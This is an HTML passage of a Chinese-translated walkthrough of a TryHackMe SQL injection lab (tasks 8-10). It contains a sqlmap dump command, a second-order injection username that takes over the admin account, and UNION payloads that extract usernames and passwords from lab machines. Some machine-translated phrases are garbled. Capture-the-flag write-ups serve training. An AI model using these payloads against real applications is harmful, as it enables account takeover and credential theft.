le lf lg lh li lj lk ll lm ln ij bi translated">这次挑战的旗帜是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qo"><img src="../Images/f62ec8e8277cf9e3a99c7ee11f58ba0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*js1dQaO2dxOFPYehQrt-vw.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qp"><img src="../Images/e4fcf8070aca96e372c7e7a7048fb930.png" data-original-src="https://miro.medium.com/v2/resize:fit:606/format:webp/1*Y6oixkub18hU5jxbJAJnEg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qq"><img src="../Images/6c87f22d7cc0f4ded1c07370a73a0ee7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x2cI9qTHZkdh-dfQITuzyw.png"/></div></div></figure><p id="7376" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">最后增加“<strong class="ku ir"> -T用户—转储</strong>”</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0714" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper so-tamper.py --url <a class="ae kr" href="http://10.10.224.106:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.224.106:5000/challenge4/signup</a> --data "username=admin&amp;password=asd" --second-url <a class="ae kr" href="http://10.10.224.106:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.224.106:5000/challenge4/notes</a> -p username --dbms=sqlite --technique=U --no-cast <strong class="mz ir">-T users --dump</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qr"><img src="../Images/87fb5c2bf0f2037771c1dbb91319b5d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h6EhqVxOYnbVB64g9b-QgA.png"/></div></div></figure><h1 id="894b" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务8:易受攻击的启动:更改密码</h1><h1 id="452f" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="8d0f" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">对于此挑战，注释页面上的漏洞已被修复。新的更改密码功能已经添加到应用程序中，因此用户现在可以通过导航到配置文件页面来更改他们的密码。新函数容易受到SQL注入攻击，因为UPDATE语句将用户名直接连接到SQL查询中，如下所示。这里的目标是利用易受攻击的功能来获取管理员帐户的访问权限。</p><h1 id="dbbd" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="5b83" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">开发人员为密码参数使用了一个占位符，因为该输入直接来自用户。用户名不是直接来自用户，而是根据存储在会话对象中的用户id从数据库中获取。因此，开发人员认为使用用户名是安全的，并将其直接连接到查询中，而不是使用占位符:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="2437" class="lo lp iq mz b gy nd ne l nf ng">UPDATE users SET password = ? WHERE username = '" + username + "'</span></pre><p id="6770" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">为了利用这个漏洞并获得管理员用户帐户的访问权限，我们可以创建一个名为<code class="fe qs qt qu mz b">admin'-- -</code>的用户。</p><p id="d174" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注册恶意用户后，我们可以更新新用户的密码来触发漏洞。更改密码时，应用程序执行两个查询。首先，它向数据库询问我们当前用户的用户名和密码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="5557" class="lo lp iq mz b gy nd ne l nf ng">SELECT username, password FROM users WHERE <strong class="mz ir">id</strong> = ?</span></pre><p id="8c38" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果所有检查都没问题，它将尝试为我们的用户更新密码。因为用户名直接连接到SQL查询中，所以执行的查询将如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="d469" class="lo lp iq mz b gy nd ne l nf ng">UPDATE users SET password = ? WHERE username = 'admin' -- -'</span></pre><p id="b90d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着应用程序没有更新<code class="fe qs qt qu mz b">admin' -- -</code>的密码，而是更新了<em class="oq">管理员</em>的密码。更新密码后，可以使用新密码以管理员身份登录并查看标志。</p><h1 id="0dc8" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="f42e" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">创建一个新用户并利用更新密码功能中的漏洞来访问admin帐户以获取标志。</p><p id="d918" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们用<strong class="ku ir"> admin创建新用户—:ASD</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qv"><img src="../Images/c8669053b1a0467291bb3b34d4094a03.png" data-original-src="https://miro.medium.com/v2/resize:fit:698/format:webp/1*BwOjPo3cjFhdkTXWb1cTWA.png"/></div></figure><p id="4b4d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在登录到用户<strong class="ku ir">admin’—:ASD</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qw"><img src="../Images/1d757adb71356e69d61ff3a747a398c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:674/format:webp/1*y_BJyA7l3X5IHLWNzRicAQ.png"/></div></figure><p id="6970" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">登录后，转到个人资料页面，并通过此查询更改密码</p><p id="7a31" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">旧密码= <strong class="ku ir"> asd </strong></p><p id="5d83" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">新密码= <strong class="ku ir">通过</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qx"><img src="../Images/dda158417984396763860527bdb6a2c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R1OVaTC2Qa_BOSTcr2x7Ew.png"/></div></div></figure><p id="6b1a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">是的，密码已更改，现在以管理员身份登录<strong class="ku ir">管理员:通过</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qy"><img src="../Images/b24da36552d06c6c2101e5bffb27db0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:712/format:webp/1*lx6P49OzPCxBQwGC4mhXpQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qz"><img src="../Images/a96d3bd56d311ae38f1a0d726a0d11bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*RRY71kTYimlt2mPz-lwu8A.png"/></div></figure><p id="c350" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们有旗子</p><h1 id="6546" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务9:易受攻击的启动:书名</h1><h1 id="c2c6" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="3102" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">该页面增加了一个新功能，现在可以在数据库中搜索书籍。新的搜索函数易受SQL注入攻击，因为它将用户输入直接连接到SQL语句中。任务的目标是利用这个漏洞找到隐藏的标志。</p><h1 id="4466" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="a794" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">当用户首次登录挑战时，会出现一条消息，提示他们:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9754" class="lo lp iq mz b gy nd ne l nf ng">Testing a new function to search for books, check it out here</span></pre><p id="8a88" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">“此处”文本是一个链接，将用户带到<a class="ae kr" href="http://10.10.141.207/challenge6/book?title=test" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 141 . 207/challenge 6/book？title=test </a>，这是包含易受攻击的搜索功能的页面，可以在这里看到:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ra"><img src="../Images/4df09af52600e40ca510826ca5b60945.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*oqECeJ7-h2Ar13Tc.png"/></div></div></figure><p id="cfd5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当搜索一本书时，web页面使用参数<code class="fe qs qt qu mz b">title</code>执行GET请求。它执行的查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="3887" class="lo lp iq mz b gy nd ne l nf ng">SELECT * from books WHERE <strong class="mz ir">id</strong> = (SELECT <strong class="mz ir">id</strong> FROM books WHERE title like '" + title + "%')</span></pre><p id="00b4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们需要做的就是在LIKE操作符的右边关闭LIKE操作数。例如，我们可以通过注入以下命令来转储数据库中的所有书籍:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="33b5" class="lo lp iq mz b gy nd ne l nf ng">') or 1=1-- -</span></pre><h1 id="0f2e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="c998" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">使用你所知道的关于SQL注入联盟的知识，利用易受攻击的图书搜索功能来检索旗帜。</p><p id="2b2c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">创建新用户<strong class="ku ir"> sam2:asd </strong></p><p id="b09f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">并登录帐户</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rb"><img src="../Images/d8d625afda29aebb090d1260b91bb1b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L39hS6vSU9dAC1O9EfcZXw.png"/></div></div></figure><p id="e74a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们可以通过注入以下命令来转储数据库中的所有书籍:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4a8e" class="lo lp iq mz b gy nd ne l nf ng">') or 1=1-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rc"><img src="../Images/cfa5c5e5ae0a0da02c7bd3a78793e4ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/1*O-pZkdJW80JGm5Iv03IaAQ.png"/></div></div></figure><p id="c963" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在事先不知道列数的情况下，攻击者必须首先通过系统地注入具有不同列数的查询来枚举列数，直到显示错误。例如:</p><p id="1115" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">尝试每一个有效载荷</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="407c" class="lo lp iq mz b gy nd ne l nf ng">') order by 1-- -<br/>') order by 2-- -<br/>') order by 3-- -<br/>') order by 4-- -<br/>') order by 5-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/383b1816929ba7f1a2e9ceaf36ccb52b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*BgF2TepSkKUDjy9ImOFXIQ.png"/></div></figure><p id="b2f2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当我尝试的时候</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4c5f" class="lo lp iq mz b gy nd ne l nf ng">') order by 5-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi re"><img src="../Images/3184f452825339e177b3000f00bbcf77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*JhH8EKg-1WucPYAr7ByVBg.png"/></div></figure><p id="de33" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">它没有向我显示任何东西，这意味着这是攻击者的错误</p><p id="a670" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着在数据库中只有4列</p><p id="84bb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们检查一下有多少列容易受到攻击，为此我们使用了<strong class="ku ir"> UNION SELECT </strong></p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="091d" class="lo lp iq mz b gy nd ne l nf ng">') union select 1,2,3,4-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rf"><img src="../Images/bcf79d43565a5a7979889a348c08b01e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JkKKoBBv0vFiTZd8e_4fCQ.png"/></div></div></figure><p id="17d2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">查询显示第3列是易受攻击的<strong class="ku ir"> {2，3，4} </strong>位置</p><p id="b867" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们从数据库中获取信息</p><p id="ec9b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果你了解mysql，你可以很容易理解这个查询</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="3f04" class="lo lp iq mz b gy nd ne l nf ng">') union select 1,group_concat(username),group_concat(password),4 from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rg"><img src="../Images/3b215fc051881e62e75a11387455c877.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W7o3XINE5CRdGqhqPi2-gA.png"/></div></div></figure><h1 id="6228" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务10:易受攻击的启动:书名2</h1><h1 id="5ffc" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="5792" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">在这个挑战中，应用程序在过程的早期执行查询。然后，它在第二个查询中使用第一个查询的结果，而不进行清理。这两个查询都容易受到攻击，第一个查询可以通过盲SQL注入被利用。然而，由于第二个查询也是易受攻击的，所以可以简化利用并使用基于联合的注入来代替基于布尔的盲注入；使开发更容易，噪音更小。任务的目标是在不使用盲SQL注入的情况下滥用此漏洞并取回旗帜。</p><h1 id="5a60" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="fa5a" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">当用户首次登录挑战时，会出现一条消息，提示他们:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="347d" class="lo lp iq mz b gy nd ne l nf ng">Testing a new function to search for books, check it out here</span></pre><p id="ba49" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">“此处”文本是一个链接，将用户带到<a class="ae kr" href="http://10.10.141.207/challenge7/book?title=test" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 141 . 207:5000/challenge 7/book？title=test </a>，这是包含易受攻击的搜索功能的页面，可以在此处看到:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rh"><img src="../Images/071b9e3002c5cdc2d273759d75001f54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gbmI47RD8oHGyvFc.png"/></div></div></figure><p id="ffcd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当搜索书名时，网页执行GET请求。然后应用程序执行两个查询，第一个查询获取书的ID，然后在这个过程的后面，执行一个新的SQL查询来获取关于书的所有信息。这里可以看到两个查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="61c4" class="lo lp iq mz b gy nd ne l nf ng">bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)</span><span id="f478" class="lo lp iq mz b gy nh ne l nf ng">if bid:</span><span id="21ce" class="lo lp iq mz b gy nh ne l nf ng">query = f"SELECT * FROM books WHERE id = '{bid['id']}'"</span></pre><p id="2677" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">首先，我们将结果限制为零行，这可以通过不给它任何输入或我们知道不存在的输入来实现。然后，我们可以使用UNION子句来控制第一个查询返回的内容，即第二个查询将使用的数据。这意味着我们可以在搜索字段中注入以下值:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f1b6" class="lo lp iq mz b gy nd ne l nf ng">' union select 'STRING</span></pre><p id="85b9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注入上述代码后，应用程序将执行以下SQL查询:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/1f7b5fc26a4a2924c5aff646333ada5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/0*770oBYuuY4XeIOf0.png"/></div></figure><p id="76b8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从查询中，我们可以看到第一个查询的结果是STRING%，它用在第二个查询的WHERE子句中。</p><p id="6f0d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果我们用数据库中存在的数字替换' STRING ',应用程序应该返回一个有效的对象。但是，应用程序在字符串中添加了通配符(%)，这意味着我们必须首先注释掉通配符。可以通过在我们注入的字符串末尾附加'—'来注释掉通配符。例如，如果我们注入以下代码行:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="db51" class="lo lp iq mz b gy nd ne l nf ng">' union select '1'-- -</span></pre><p id="c271" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序应该向用户显示ID为1的图书，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ri"><img src="../Images/89ae81e358fd424d06f73f81d05f9f09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7tkxjdUgQ1Yp8R-p.png"/></div></div></figure><p id="e8a9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果我们没有首先将结果限制为零行，我们就不会得到UNION语句的输出，而是会得到LIKE子句的内容。例如，通过注入以下字符串:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6c72" class="lo lp iq mz b gy nd ne l nf ng">test' union select '1'-- -</span></pre><p id="0e97" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序将执行以下查询:。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/7a257efd20d174759c57f5a1e8ae8352.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/0*j404gJI3X-63H-BW.png"/></div></figure><p id="acd2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们已经完全控制了第二个查询，我们可以使用基于联合的SQL注入从数据库中提取数据。目标是使第二个查询类似于以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a322" class="lo lp iq mz b gy nd ne l nf ng">SELECT * FROM books WHERE <strong class="mz ir">id</strong> = '' union select 1,2,3,4-- -</span></pre><p id="be21" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让应用程序执行上面的查询应该和注入下面的查询一样简单:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="2ca9" class="lo lp iq mz b gy nd ne l nf ng">' union select '1' union select 1,2,3,4-- -</span></pre><p id="6bd9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，我们通过在第二个UNION子句前附加单引号(')来结束应该返回的字符串。为了使查询有效并返回第二个UNION子句，我们必须对单引号进行转义。对单引号进行转义可以通过将引号(')对折来完成。将引号加倍后，我们得到以下字符串:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="cdb5" class="lo lp iq mz b gy nd ne l nf ng">' union select '-1''union select 1,2,3,4-- -</span></pre><p id="d19c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注入上面的字符串将返回如下所示的页面:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rj"><img src="../Images/f89e870006a6c214826a3d742d5f89e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*AJ7N3lxgyHSPl-aXc-myUQ.png"/></div></figure><h1 id="a5fc" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="30b9" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">使用你所了解的关于SQL注入联盟的知识，利用易受攻击的图书搜索功能来检索旗帜</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="2110" class="lo lp iq mz b gy nd ne l nf ng">' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rk"><img src="../Images/1378fa0002008ceb68a18a46b6c33dda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SIFSkoQNTC1grQW9tqHjSQ.png"/></div></div></figure><p id="68d8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们拿到最后一面旗了</p><p id="4b23" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">你可以在:<br/><strong class="ku ir">LinkedIn:-</strong><a class="ae kr" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ku ir">Twitter:-</strong><a class="ae kr" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ku ir">Tryhackme:-</strong><a class="ae kr" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rl"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="8fb1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="57d4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">访问我的其他演练:-</p><p id="993b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>